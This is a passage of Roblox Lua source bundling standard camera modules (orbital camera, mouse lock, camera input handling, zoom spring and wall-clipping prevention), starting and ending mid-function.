			local horizontalShift = Util.GetAngleBetweenXZVectors(newDesiredLook, self:GetCameraLookVector())
			local vertShift = math.asin(self:GetCameraLookVector().y) - math.asin(newDesiredLook.y)
			if not Util.IsFinite(horizontalShift) then
				horizontalShift = 0
			end
			if not Util.IsFinite(vertShift) then
				vertShift = 0
			end
		end
		
		--[[ Functions of BaseCamera that are overridden by OrbitalCamera ]]--
		function OrbitalCamera:GetCameraToSubjectDistance()
			return self.curDistance
		end
		
		function OrbitalCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			local player = PlayersService.LocalPlayer
			if player then
				self.currentSubjectDistance = math.clamp(desiredSubjectDistance, self.minDistance, self.maxDistance)
		
				-- OrbitalCamera is not allowed to go into the first-person range
				self.currentSubjectDistance = math.max(self.currentSubjectDistance, self.FIRST_PERSON_DISTANCE_THRESHOLD)
			end
			self.inFirstPerson = false
			self:UpdateMouseBehavior()
			return self.currentSubjectDistance
		end
		
		function OrbitalCamera:CalculateNewLookVector(suppliedLookVector, xyRotateVector)
			local currLookVector = suppliedLookVector or self:GetCameraLookVector()
			local currPitchAngle = math.asin(currLookVector.y)
			local yTheta = math.clamp(xyRotateVector.y, currPitchAngle - math.rad(MAX_ALLOWED_ELEVATION_DEG), currPitchAngle - math.rad(MIN_ALLOWED_ELEVATION_DEG))
			local constrainedRotateInput = Vector2.new(xyRotateVector.x, yTheta)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local newLookVector = (CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)).lookVector
			return newLookVector
		end
		
		-- [[ Update ]]--
		function OrbitalCamera:Update(dt)
			local now = tick()
			local timeDelta = (now - self.lastUpdate)
			local userPanningTheCamera = CameraInput.getRotation() ~= Vector2.new()
			local camera = 	workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus
			local player = PlayersService.LocalPlayer
			local cameraSubject = camera and camera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA('VehicleSeat')
			local isOnASkateboard = cameraSubject and cameraSubject:IsA('SkateboardPlatform')
		
			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastCameraTransform = nil
			end
		
			-- Reset tween speed if user is panning
			if userPanningTheCamera then
				self.lastUserPanCamera = tick()
			end
		
			local subjectPosition = self:GetSubjectPosition()
		
			if subjectPosition and player and camera then
		
				-- Process any dollying being done by gamepad
				-- TODO: Move this
				if self.gamepadDollySpeedMultiplier ~= 1 then
					self:SetCameraToSubjectDistance(self.currentSubjectDistance * self.gamepadDollySpeedMultiplier)
				end
		
				local VREnabled = VRService.VREnabled
				newCameraFocus = VREnabled and self:GetVRFocus(subjectPosition, timeDelta) or CFrame.new(subjectPosition)
		
				local flaggedRotateInput = CameraInput.getRotation()
		
				local cameraFocusP = newCameraFocus.p
				if VREnabled and not self:IsInFirstPerson() then
					local cameraHeight = self:GetCameraHeight()
					local vecToSubject = (subjectPosition - camera.CFrame.p)
					local distToSubject = vecToSubject.magnitude
		
					-- Only move the camera if it exceeded a maximum distance to the subject in VR
					if distToSubject > self.currentSubjectDistance or flaggedRotateInput.x ~= 0 then
						local desiredDist = math.min(distToSubject, self.currentSubjectDistance)
		
						-- Note that CalculateNewLookVector is overridden from BaseCamera
						vecToSubject = self:CalculateNewLookVector(vecToSubject.unit * X1_Y0_Z1, Vector2.new(flaggedRotateInput.x, 0)) * desiredDist
		
						local newPos = cameraFocusP - vecToSubject
						local desiredLookDir = camera.CFrame.lookVector
						if flaggedRotateInput.x ~= 0 then
							desiredLookDir = vecToSubject
						end
						local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
						newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
					end
				else
					-- rotateInput is a Vector2 of mouse movement deltas since last update
					self.curAzimuthRad = self.curAzimuthRad - flaggedRotateInput.x
		
					if self.useAzimuthLimits then
						self.curAzimuthRad = math.clamp(self.curAzimuthRad, self.minAzimuthAbsoluteRad, self.maxAzimuthAbsoluteRad)
					else
						self.curAzimuthRad = (self.curAzimuthRad ~= 0) and (math.sign(self.curAzimuthRad) * (math.abs(self.curAzimuthRad) % TAU)) or 0
					end
		
					self.curElevationRad = math.clamp(self.curElevationRad + flaggedRotateInput.y, self.minElevationRad, self.maxElevationRad)
		
					local cameraPosVector = self.currentSubjectDistance * ( CFrame.fromEulerAnglesYXZ( -self.curElevationRad, self.curAzimuthRad, 0 ) * UNIT_Z )
					local camPos = subjectPosition + cameraPosVector
		
					newCameraCFrame = CFrame.new(camPos, subjectPosition)
				end
		
				self.lastCameraTransform = newCameraCFrame
				self.lastCameraFocus = newCameraFocus
				if (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
					self.lastSubjectCFrame = cameraSubject.CFrame
				else
					self.lastSubjectCFrame = nil
				end
			end
		
			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end
		
		return OrbitalCamera
		
	end[mouse_lock_controller] = function()
		--[[
			MouseLockController - Replacement for ShiftLockController, manages use of mouse-locked mode
			2018 Camera Update - AllYourBlox
		--]]
		
		--[[ Constants ]]--
		local DEFAULT_MOUSE_LOCK_CURSOR = "rbxasset://textures/MouseLockedCursor.png"
		
		local CONTEXT_ACTION_NAME = "MouseLockSwitchAction"
		local MOUSELOCK_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value
		
		--[[ Services ]]--
		local PlayersService = game:GetService("Players")
		local ContextActionService = game:GetService("ContextActionService")
		local Settings = UserSettings()	-- ignore warning
		local GameSettings = Settings.GameSettings
		local Mouse = PlayersService.LocalPlayer:GetMouse()
		
		--[[ The Module ]]--
		local MouseLockController = {}
		MouseLockController.__index = MouseLockController
		
		function MouseLockController.new()
			local self = setmetatable({}, MouseLockController)
		
			self.isMouseLocked = false
			self.savedMouseCursor = nil
			self.boundKeys = {Enum.KeyCode.LeftShift, Enum.KeyCode.RightShift} -- defaults
		
			self.mouseLockToggledEvent = Instance.new("BindableEvent")
		
			local boundKeysObj = script:FindFirstChild("BoundKeys")
			if (not boundKeysObj) or (not boundKeysObj:IsA("StringValue")) then
				-- If object with correct name was found, but it's not a StringValue, destroy and replace
				if boundKeysObj then
					boundKeysObj:Destroy()
				end
		
				boundKeysObj = Instance.new("StringValue")
				boundKeysObj.Name = "BoundKeys"
				boundKeysObj.Value = "LeftShift,RightShift"
				boundKeysObj.Parent = script
			end
		
			if boundKeysObj then
				boundKeysObj.Changed:Connect(function(value)
					self:OnBoundKeysObjectChanged(value)
				end)
				self:OnBoundKeysObjectChanged(boundKeysObj.Value) -- Initial setup call
			end
		
			-- Watch for changes to user's ControlMode and ComputerMovementMode settings and update the feature availability accordingly
			GameSettings.Changed:Connect(function(property)
				if property == "ControlMode" or property == "ComputerMovementMode" then
					self:UpdateMouseLockAvailability()
				end
			end)
		
			-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
			PlayersService.LocalPlayer:GetPropertyChangedSignal("DevEnableMouseLock"):Connect(function()
				self:UpdateMouseLockAvailability()
			end)
		
			-- Watch for changes to DevEnableMouseLock and update the feature availability accordingly
			PlayersService.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
				self:UpdateMouseLockAvailability()
			end)
		
			self:UpdateMouseLockAvailability()
		
			return self
		end
		
		function MouseLockController:GetIsMouseLocked()
			return self.isMouseLocked
		end
		
		function MouseLockController:GetBindableToggleEvent()
			return self.mouseLockToggledEvent.Event
		end
		
		function MouseLockController:GetMouseLockOffset()
			local offsetValueObj = script:FindFirstChild("CameraOffset")
			if offsetValueObj and offsetValueObj:IsA("Vector3Value") then
				return offsetValueObj.Value
			else
				-- If CameraOffset object was found but not correct type, destroy
				if offsetValueObj then
					offsetValueObj:Destroy()
				end
				offsetValueObj = Instance.new("Vector3Value")
				offsetValueObj.Name = "CameraOffset"
				offsetValueObj.Value = Vector3.new(1.75,0,0) -- Legacy Default Value
				offsetValueObj.Parent = script
			end
		
			if offsetValueObj and offsetValueObj.Value then
				return offsetValueObj.Value
			end
		
			return Vector3.new(1.75,0,0)
		end
		
		function MouseLockController:UpdateMouseLockAvailability()
			local devAllowsMouseLock = PlayersService.LocalPlayer.DevEnableMouseLock
			local devMovementModeIsScriptable = PlayersService.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable
			local userHasMouseLockModeEnabled = GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch
			local userHasClickToMoveEnabled =  GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove
			local MouseLockAvailable = devAllowsMouseLock and userHasMouseLockModeEnabled and not userHasClickToMoveEnabled and not devMovementModeIsScriptable
		
			if MouseLockAvailable~=self.enabled then
				self:EnableMouseLock(MouseLockAvailable)
			end
		end
		
		function MouseLockController:OnBoundKeysObjectChanged(newValue)
			self.boundKeys = {} -- Overriding defaults, note: possibly with nothing at all if boundKeysObj.Value is "" or contains invalid values
			for token in string.gmatch(newValue,"[^%s,]+") do
				for _, keyEnum in pairs(Enum.KeyCode:GetEnumItems()) do
					if token == keyEnum.Name then
						self.boundKeys[#self.boundKeys+1] = keyEnum
						break
					end
				end
			end
			self:UnbindContextActions()
			self:BindContextActions()
		end
		
		--[[ Local Functions ]]--
		function MouseLockController:OnMouseLockToggled()
			self.isMouseLocked = not self.isMouseLocked
		
			if self.isMouseLocked then
				local cursorImageValueObj = script:FindFirstChild("CursorImage")
				if cursorImageValueObj and cursorImageValueObj:IsA("StringValue") and cursorImageValueObj.Value then
					self.savedMouseCursor = Mouse.Icon
					Mouse.Icon = cursorImageValueObj.Value
				else
					if cursorImageValueObj then
						cursorImageValueObj:Destroy()
					end
					cursorImageValueObj = Instance.new("StringValue")
					cursorImageValueObj.Name = "CursorImage"
					cursorImageValueObj.Value = DEFAULT_MOUSE_LOCK_CURSOR
					cursorImageValueObj.Parent = script
					self.savedMouseCursor = Mouse.Icon
					Mouse.Icon = DEFAULT_MOUSE_LOCK_CURSOR
				end
			else
				if self.savedMouseCursor then
					Mouse.Icon = self.savedMouseCursor
					self.savedMouseCursor = nil
				end
			end
		
			self.mouseLockToggledEvent:Fire()
		end
		
		function MouseLockController:DoMouseLockSwitch(name, state, input)
			if state == Enum.UserInputState.Begin then
				self:OnMouseLockToggled()
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end
		
		function MouseLockController:BindContextActions()
			ContextActionService:BindActionAtPriority(CONTEXT_ACTION_NAME, function(name, state, input)
				return self:DoMouseLockSwitch(name, state, input)
			end, false, MOUSELOCK_ACTION_PRIORITY, unpack(self.boundKeys))
		end
		
		function MouseLockController:UnbindContextActions()
			ContextActionService:UnbindAction(CONTEXT_ACTION_NAME)
		end
		
		function MouseLockController:IsMouseLocked()
			return self.enabled and self.isMouseLocked
		end
		
		function MouseLockController:EnableMouseLock(enable)
			if enable ~= self.enabled then
		
				self.enabled = enable
		
				if self.enabled then
					-- Enabling the mode
					self:BindContextActions()
				else
					-- Disabling
					-- Restore mouse cursor
					if Mouse.Icon~="" then
						Mouse.Icon = ""
					end
		
					self:UnbindContextActions()
		
					-- If the mode is disabled while being used, fire the event to toggle it off
					if self.isMouseLocked then
						self.mouseLockToggledEvent:Fire()
					end
		
					self.isMouseLocked = false
				end
		
			end
		end
		
		return MouseLockController
		
	end[camera_input] = function()
		local ContextActionService = game:GetService("ContextActionService")
		local UserInputService = game:GetService("UserInputService")
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")
		
		local player = Players.LocalPlayer
		
		local CAMERA_INPUT_PRIORITY = Enum.ContextActionPriority.Default.Value
		local MB_TAP_LENGTH = 0.3 -- (s) length of time for a short mouse button tap to be registered
		
		local ROTATION_SPEED_KEYS = math.rad(120) -- (rad/s)
		local ROTATION_SPEED_MOUSE = Vector2.new(1, 0.77)*math.rad(0.5) -- (rad/s)
		local ROTATION_SPEED_POINTERACTION = Vector2.new(1, 0.77)*math.rad(7) -- (rad/s)
		local ROTATION_SPEED_TOUCH = Vector2.new(1, 0.66)*math.rad(1) -- (rad/s)
		local ROTATION_SPEED_GAMEPAD = Vector2.new(1, 0.77)*math.rad(4) -- (rad/s)
		
		local ZOOM_SPEED_MOUSE = 1 -- (scaled studs/wheel click)
		local ZOOM_SPEED_KEYS = 0.1 -- (studs/s)
		local ZOOM_SPEED_TOUCH = 0.04 -- (scaled studs/DIP %)
		
		local MIN_TOUCH_SENSITIVITY_FRACTION = 0.25 -- 25% sensitivity at 90°
		
		-- right mouse button up & down events
		local rmbDown, rmbUp do
			local rmbDownBindable = Instance.new("BindableEvent")
			local rmbUpBindable = Instance.new("BindableEvent")
		
			rmbDown = rmbDownBindable.Event
			rmbUp = rmbUpBindable.Event
		
			UserInputService.InputBegan:Connect(function(input, gpe)
				if not gpe and input.UserInputType == Enum.UserInputType.MouseButton2 then
					rmbDownBindable:Fire()
				end
			end)
		
			UserInputService.InputEnded:Connect(function(input, gpe)
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					rmbUpBindable:Fire()
				end
			end)
		end
		
		local thumbstickCurve do
			local K_CURVATURE = 2 -- amount of upwards curvature (0 is flat)
			local K_DEADZONE = 0.1 -- deadzone
		
			function thumbstickCurve(x)
				-- remove sign, apply linear deadzone
				local fDeadzone = (math.abs(x) - K_DEADZONE)/(1 - K_DEADZONE)
				
				-- apply exponential curve and scale to fit in [0, 1]
				local fCurve = (math.exp(K_CURVATURE*fDeadzone) - 1)/(math.exp(K_CURVATURE) - 1)
				
				-- reapply sign and clamp
				return math.sign(x)*math.clamp(fCurve, 0, 1)
			end
		end
		
		-- Adjust the touch sensitivity so that sensitivity is reduced when swiping up
		-- or down, but stays the same when swiping towards the middle of the screen
		local function adjustTouchPitchSensitivity(delta)
			local camera = workspace.CurrentCamera
		
			if not camera then
				return delta
			end
			
			-- get the camera pitch in world space
			local pitch = camera.CFrame:ToEulerAnglesYXZ()
			
			if delta.Y*pitch >= 0 then
				-- do not reduce sensitivity when pitching towards the horizon
				return delta
			end
			
			-- set up a line to fit:
			-- 1 = f(0)
			-- 0 = f(±pi/2)
			local curveY = 1 - (2*math.abs(pitch)/math.pi)^0.75
		
			-- remap curveY from [0, 1] -> [MIN_TOUCH_SENSITIVITY_FRACTION, 1]
			local sensitivity = curveY*(1 - MIN_TOUCH_SENSITIVITY_FRACTION) + MIN_TOUCH_SENSITIVITY_FRACTION
		
			return Vector2.new(1, sensitivity)*delta
		end
		
		local function isInDynamicThumbstickArea(pos)
			local playerGui = player:FindFirstChildOfClass("PlayerGui")
			local touchGui = playerGui and playerGui:FindFirstChild("TouchGui")
			local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
			local thumbstickFrame = touchFrame and touchFrame:FindFirstChild("DynamicThumbstickFrame")
		
			if not thumbstickFrame then
				return false
			end
			
			if not touchGui.Enabled then
				return false
			end
		
			local posTopLeft = thumbstickFrame.AbsolutePosition
			local posBottomRight = posTopLeft + thumbstickFrame.AbsoluteSize
		
			return
				pos.X >= posTopLeft.X and
				pos.Y >= posTopLeft.Y and
				pos.X <= posBottomRight.X and
				pos.Y <= posBottomRight.Y
		end
		
		local worldDt = 1/60
		RunService.Stepped:Connect(function(_, _worldDt)
			worldDt = _worldDt
		end)
		
		local CameraInput = {}
		
		do
			local connectionList = {}
			local panInputCount = 0
		
			local function incPanInputCount()
				panInputCount = math.max(0, panInputCount + 1)
			end
		
			local function decPanInputCount()
				panInputCount = math.max(0, panInputCount - 1)
			end
		
			local touchPitchSensitivity = 1
			local gamepadState = {
				Thumbstick2 = Vector2.new(),
			}
			local keyboardState = {
				Left = 0,
				Right = 0,
				I = 0,
				O = 0
			}
			local mouseState = {
				Movement = Vector2.new(),
				Wheel = 0, -- PointerAction
				Pan = Vector2.new(), -- PointerAction
				Pinch = 0, -- PointerAction
			}
			local touchState = {
				Move = Vector2.new(),
				Pinch = 0,
			}
			
			local gamepadZoomPressBindable = Instance.new("BindableEvent")
			CameraInput.gamepadZoomPress = gamepadZoomPressBindable.Event
			
			function CameraInput.getRotationActivated()
				return panInputCount > 0 or gamepadState.Thumbstick2.Magnitude > 0
			end
			
			function CameraInput.getRotation(disableKeyboardRotation)
				local inversionVector = Vector2.new(1, UserGameSettings:GetCameraYInvertValue())
		
				-- keyboard input is non-coalesced, so must account for time delta
				local kKeyboard = Vector2.new(keyboardState.Right - keyboardState.Left, 0)*worldDt
				local kGamepad = gamepadState.Thumbstick2
				local kMouse = mouseState.Movement
				local kPointerAction = mouseState.Pan
				local kTouch = adjustTouchPitchSensitivity(touchState.Move)
		
				if disableKeyboardRotation then
					kKeyboard = Vector2.new()
				end
		
				local result =
					kKeyboard*ROTATION_SPEED_KEYS +
					kGamepad*ROTATION_SPEED_GAMEPAD +
					kMouse*ROTATION_SPEED_MOUSE +
					kPointerAction*ROTATION_SPEED_POINTERACTION +
					kTouch*ROTATION_SPEED_TOUCH
		
				return result*inversionVector
			end
			
			function CameraInput.getZoomDelta()
				local kKeyboard = keyboardState.O - keyboardState.I
				local kMouse = -mouseState.Wheel + mouseState.Pinch
				local kTouch = -touchState.Pinch
				return kKeyboard*ZOOM_SPEED_KEYS + kMouse*ZOOM_SPEED_MOUSE + kTouch*ZOOM_SPEED_TOUCH
			end
		
			do
				local function thumbstick(action, state, input)
					local position = input.Position
					gamepadState[input.KeyCode.Name] = Vector2.new(thumbstickCurve(position.X), -thumbstickCurve(position.Y))
				end
		
				local function mouseMovement(input)
					local delta = input.Delta
					mouseState.Movement = Vector2.new(delta.X, delta.Y)
				end
				
				local function mouseWheel(action, state, input)
					mouseState.Wheel = input.Position.Z
					return Enum.ContextActionResult.Pass
				end
				
				local function keypress(action, state, input)
					keyboardState[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
				end
				
				local function gamepadZoomPress(action, state, input)
					if state == Enum.UserInputState.Begin then
						gamepadZoomPressBindable:Fire()
					end
				end
				
				local function resetInputDevices()
					for _, device in pairs({
						gamepadState,
						keyboardState,
						mouseState,
						touchState,
					}) do
						for k, v in pairs(device) do
							if type(v) == "boolean" then
								device[k] = false
							else
								device[k] *= 0 -- Mul by zero to preserve vector types
							end
						end
					end
				end
		
				local touchBegan, touchChanged, touchEnded, resetTouchState do
					-- Use TouchPan & TouchPinch when they work in the Studio emulator
		
					local touches = {} -- {[InputObject] = sunk}
					local dynamicThumbstickInput -- Special-cased 
					local lastPinchDiameter
		
					function touchBegan(input, sunk)
						assert(input.UserInputType == Enum.UserInputType.Touch)
						assert(input.UserInputState == Enum.UserInputState.Begin)
						
						if dynamicThumbstickInput == nil and isInDynamicThumbstickArea(input.Position) and not sunk then
							-- any finger down starting in the dynamic thumbstick area should always be
							-- ignored for camera purposes. these must be handled specially from all other
							-- inputs, as the DT does not sink inputs by itself
							dynamicThumbstickInput = input
							return
						end
						
						if not sunk then
							incPanInputCount()
						end
						
						-- register the finger
						touches[input] = sunk
					end
		
					function touchEnded(input, sunk)
						assert(input.UserInputType == Enum.UserInputType.Touch)
						assert(input.UserInputState == Enum.UserInputState.End)
						
						-- reset the DT input
						if input == dynamicThumbstickInput then
							dynamicThumbstickInput = nil
						end
						
						-- reset pinch state if one unsunk finger lifts
						if touches[input] == false then
							lastPinchDiameter = nil
							decPanInputCount()
						end
						
						-- unregister input
						touches[input] = nil
					end
		
					function touchChanged(input, sunk)
						assert(input.UserInputType == Enum.UserInputType.Touch)
						assert(input.UserInputState == Enum.UserInputState.Change)
						
						-- ignore movement from the DT finger
						if input == dynamicThumbstickInput then
							return
						end
						
						-- fixup unknown touches
						if touches[input] == nil then
							touches[input] = sunk
						end
						
						-- collect unsunk touches
						local unsunkTouches = {}
						for touch, sunk in pairs(touches) do
							if not sunk then
								table.insert(unsunkTouches, touch)
							end
						end
						
						-- 1 finger: pan
						if #unsunkTouches == 1 then
							if touches[input] == false then
								local delta = input.Delta
								touchState.Move = Vector2.new(delta.X, delta.Y)
							end
						end
						
						-- 2 fingers: pinch
						if #unsunkTouches == 2 then
							local pinchDiameter = (unsunkTouches[1].Position - unsunkTouches[2].Position).Magnitude
							
							if lastPinchDiameter then
								touchState.Pinch = pinchDiameter - lastPinchDiameter
							end
							
							lastPinchDiameter = pinchDiameter
						else
							lastPinchDiameter = nil
						end
					end
		
					function resetTouchState()
						touches = {}
						dynamicThumbstickInput = nil
						lastPinchDiameter = nil
					end
				end
		
				local function pointerAction(wheel, pan, pinch, gpe)
					if not gpe then
						mouseState.Wheel = wheel
						mouseState.Pan = pan
						mouseState.Pinch = -pinch
					end
				end
		
				local function inputBegan(input, sunk)
					if input.UserInputType == Enum.UserInputType.Touch then
						touchBegan(input, sunk)
		
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 and not sunk then
						incPanInputCount()
					end
				end
		
				local function inputChanged(input, sunk)
					if input.UserInputType == Enum.UserInputType.Touch then
						touchChanged(input, sunk)
		
					elseif input.UserInputType == Enum.UserInputType.MouseMovement then
						mouseMovement(input)
					end
				end
		
				local function inputEnded(input, sunk)
					if input.UserInputType == Enum.UserInputType.Touch then
						touchEnded(input, sunk)
		
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
						decPanInputCount()
					end
				end
		
				local inputEnabled = false
		
				function CameraInput.setInputEnabled(_inputEnabled)
					if inputEnabled == _inputEnabled then
						return
					end
					inputEnabled = _inputEnabled
		
					resetInputDevices()
					resetTouchState()
		
					if inputEnabled then -- enable
						ContextActionService:BindActionAtPriority(
							"RbxCameraThumbstick",
							thumbstick,
							false,
							CAMERA_INPUT_PRIORITY,
							Enum.KeyCode.Thumbstick2
						)
		
						ContextActionService:BindActionAtPriority(
							"RbxCameraKeypress",
							keypress,
							false,
							CAMERA_INPUT_PRIORITY,
							Enum.KeyCode.Left,
							Enum.KeyCode.Right,
							Enum.KeyCode.I,
							Enum.KeyCode.O
						)
						
						ContextActionService:BindAction(
							"RbxCameraGamepadZoom",
							gamepadZoomPress,
							false,
							Enum.KeyCode.ButtonR3
						)
						
						table.insert(connectionList, UserInputService.InputBegan:Connect(inputBegan))
						table.insert(connectionList, UserInputService.InputChanged:Connect(inputChanged))
						table.insert(connectionList, UserInputService.InputEnded:Connect(inputEnded))
						table.insert(connectionList, UserInputService.PointerAction:Connect(pointerAction))
		
					else -- disable
						ContextActionService:UnbindAction("RbxCameraThumbstick")
						ContextActionService:UnbindAction("RbxCameraMouseMove")
						ContextActionService:UnbindAction("RbxCameraMouseWheel")
						ContextActionService:UnbindAction("RbxCameraKeypress")
		
						for _, conn in pairs(connectionList) do
							conn:Disconnect()
						end
						connectionList = {}
					end
				end
		
				function CameraInput.getInputEnabled()
					return inputEnabled
				end
				
				function CameraInput.resetInputForFrameEnd()
					mouseState.Movement = Vector2.new()
					touchState.Move = Vector2.new()
					touchState.Pinch = 0
		
					mouseState.Wheel = 0 -- PointerAction
					mouseState.Pan = Vector2.new() -- PointerAction
					mouseState.Pinch = 0 -- PointerAction
				end
		
				UserInputService.WindowFocused:Connect(resetInputDevices)
				UserInputService.WindowFocusReleased:Connect(resetInputDevices)
			end
		end
		
		-- Toggle pan
		do
			local holdPan = false
			local togglePan = false
			local lastRmbDown = 0 -- tick() timestamp of the last right mouse button down event
			
			function CameraInput.getHoldPan()
				return holdPan
			end
			
			function CameraInput.getTogglePan()
				return togglePan
			end
			
			function CameraInput.getPanning()
				return togglePan or holdPan
			end
			
			function CameraInput.setTogglePan(value)
				togglePan = value
			end
			
			local cameraToggleInputEnabled = false
			local rmbDownConnection
			local rmbUpConnection
			
			function CameraInput.enableCameraToggleInput()
				if cameraToggleInputEnabled then
					return
				end
				cameraToggleInputEnabled = true
			
				holdPan = false
				togglePan = false
			
				if rmbDownConnection then
					rmbDownConnection:Disconnect()
				end
			
				if rmbUpConnection then
					rmbUpConnection:Disconnect()
				end
			
				rmbDownConnection = rmbDown:Connect(function()
					holdPan = true
					lastRmbDown = tick()
				end)
			
				rmbUpConnection = rmbUp:Connect(function()
					holdPan = false
					if tick() - lastRmbDown < MB_TAP_LENGTH and (togglePan or UserInputService:GetMouseDelta().Magnitude < 2) then
						togglePan = not togglePan
					end
				end)
			end
			
			function CameraInput.disableCameraToggleInput()
				if not cameraToggleInputEnabled then
					return
				end
				cameraToggleInputEnabled = false
			
				if rmbDownConnection then
					rmbDownConnection:Disconnect()
					rmbDownConnection = nil
				end
				
				if rmbUpConnection then
					rmbUpConnection:Disconnect()
					rmbUpConnection = nil
				end
			end
		end
		
		return CameraInput
	end[zoom_controller] = function()
		-- Zoom
		-- Controls the distance between the focus and the camera.
		
		local ZOOM_STIFFNESS = 4.5
		local ZOOM_DEFAULT = 12.5
		local ZOOM_ACCELERATION = 0.0375
		
		local MIN_FOCUS_DIST = 0.5
		local DIST_OPAQUE = 1
		
		local Popper = require(script:WaitForChild("Popper"))
		
		local clamp = math.clamp
		local exp = math.exp
		local min = math.min
		local max = math.max
		local pi = math.pi
		
		local cameraMinZoomDistance, cameraMaxZoomDistance do
			local Player = game:GetService("Players").LocalPlayer
		
			local function updateBounds()
				cameraMinZoomDistance = Player.CameraMinZoomDistance
				cameraMaxZoomDistance = Player.CameraMaxZoomDistance
			end
		
			updateBounds()
		
			Player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(updateBounds)
			Player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(updateBounds)
		end
		
		local ConstrainedSpring = {} do
			ConstrainedSpring.__index = ConstrainedSpring
		
			function ConstrainedSpring.new(freq, x, minValue, maxValue)
				x = clamp(x, minValue, maxValue)
				return setmetatable({
					freq = freq, -- Undamped frequency (Hz)
					x = x, -- Current position
					v = 0, -- Current velocity
					minValue = minValue, -- Minimum bound
					maxValue = maxValue, -- Maximum bound
					goal = x, -- Goal position
				}, ConstrainedSpring)
			end
		
			function ConstrainedSpring:Step(dt)
				local freq = self.freq*2*pi -- Convert from Hz to rad/s
				local x = self.x
				local v = self.v
				local minValue = self.minValue
				local maxValue = self.maxValue
				local goal = self.goal
		
				-- Solve the spring ODE for position and velocity after time t, assuming critical damping:
				--   2*f*x'[t] + x''[t] = f^2*(g - x[t])
				-- Knowns are x[0] and x'[0].
				-- Solve for x[t] and x'[t].
		
				local offset = goal - x
				local step = freq*dt
				local decay = exp(-step)
		
				local x1 = goal + (v*dt - offset*(step + 1))*decay
				local v1 = ((offset*freq - v)*step + v)*decay
		
				-- Constrain
				if x1 < minValue then
					x1 = minValue
					v1 = 0
				elseif x1 > maxValue then
					x1 = maxValue
					v1 = 0
				end
		
				self.x = x1
				self.v = v1
		
				return x1
			end
		end
		
		local zoomSpring = ConstrainedSpring.new(ZOOM_STIFFNESS, ZOOM_DEFAULT, MIN_FOCUS_DIST, cameraMaxZoomDistance)
		
		local function stepTargetZoom(z, dz, zoomMin, zoomMax)
			z = clamp(z + dz*(1 + z*ZOOM_ACCELERATION), zoomMin, zoomMax)
			if z < DIST_OPAQUE then
				z = dz <= 0 and zoomMin or DIST_OPAQUE
			end
			return z
		end
		
		local zoomDelta = 0
		
		local Zoom = {} do
			function Zoom.Update(renderDt, focus, extrapolation)
				local poppedZoom = math.huge
		
				if zoomSpring.goal > DIST_OPAQUE then
					-- Make a pessimistic estimate of zoom distance for this step without accounting for poppercam
					local maxPossibleZoom = max(
						zoomSpring.x,
						stepTargetZoom(zoomSpring.goal, zoomDelta, cameraMinZoomDistance, cameraMaxZoomDistance)
					)
		
					-- Run the Popper algorithm on the feasible zoom range, [MIN_FOCUS_DIST, maxPossibleZoom]
					poppedZoom = Popper(
						focus*CFrame.new(0, 0, MIN_FOCUS_DIST),
						maxPossibleZoom - MIN_FOCUS_DIST,
						extrapolation
					) + MIN_FOCUS_DIST
				end
		
				zoomSpring.minValue = MIN_FOCUS_DIST
				zoomSpring.maxValue = min(cameraMaxZoomDistance, poppedZoom)
		
				return zoomSpring:Step(renderDt)
			end
			
			function Zoom.GetZoomRadius()
				return zoomSpring.x
			end
		
			function Zoom.SetZoomParameters(targetZoom, newZoomDelta)
				zoomSpring.goal = targetZoom
				zoomDelta = newZoomDelta
			end
		end
		
		return Zoom
		
	end[popper] = function()
		--------------------------------------------------------------------------------
		-- Popper.lua
		-- Prevents your camera from clipping through walls.
		--------------------------------------------------------------------------------
		
		local Players = game:GetService("Players")
		
		local camera = game.Workspace.CurrentCamera
		
		local min = math.min
		local tan = math.tan
		local rad = math.rad
		local inf = math.huge
		local ray = Ray.new
		
		local function getTotalTransparency(part)
			return 1 - (1 - part.Transparency)*(1 - part.LocalTransparencyModifier)
		end
		
		local function eraseFromEnd(t, toSize)
			for i = #t, toSize + 1, -1 do
				t[i] = nil
			end
		end
		
		local nearPlaneZ, projX, projY do
			local function updateProjection()
				local fov = rad(camera.FieldOfView)
				local view = camera.ViewportSize
				local ar = view.X/view.Y
		
				projY = 2*tan(fov/2)
				projX = ar*projY
			end
		
			camera:GetPropertyChangedSignal("FieldOfView"):Connect(updateProjection)
			camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateProjection)
		
			updateProjection()
		
			nearPlaneZ = camera.NearPlaneZ
			camera:GetPropertyChangedSignal("NearPlaneZ"):Connect(function()
				nearPlaneZ = camera.NearPlaneZ
			end)
		end
		
		local blacklist = {} do
			local charMap = {}
		
			local function refreshIgnoreList()
				local n = 1
				blacklist = {}
				for _, character in pairs(charMap) do
					blacklist[n] = character
					n = n + 1
				end
			end
		
			local function playerAdded(player)
				local function characterAdded(character)
					charMap[player] = character
					refreshIgnoreList()
				end
				local function characterRemoving()
					charMap[player] = nil
					refreshIgnoreList()
				end
		
